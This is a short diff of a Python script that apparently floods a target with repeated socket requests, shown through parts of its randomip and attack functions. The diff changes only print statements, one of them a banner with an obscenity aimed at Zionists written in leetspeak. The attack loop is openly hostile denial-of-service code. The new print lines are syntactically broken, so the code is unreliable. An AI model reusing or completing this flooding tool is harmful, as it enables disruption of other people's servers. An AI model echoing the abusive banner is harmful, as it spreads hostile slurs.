@@ -50,7 +50,7 @@ def randomip():
   return(randip)
 
 
-print("\033[48;5;5mFUCK 210N15T \033[32mand \033[38;5;7mFREE PALESTINE")
+print("\033[48;5;5mFUCK 210N15T \033[32mand \033[38;5;7mFREE PALESTINE\033[0m")
 
 
 time.sleep(1)
@@ -69,7 +69,8 @@ def attack():
       for y in range(100):
           print()
           atk.send(str.encode(request))
-          print("http://" + str(ip)
+          print("http://" +str(ip)"")
+          print(f"\" +str(randip[0])+ """)
     except socket.error:
       time.sleep(.1)
     except:
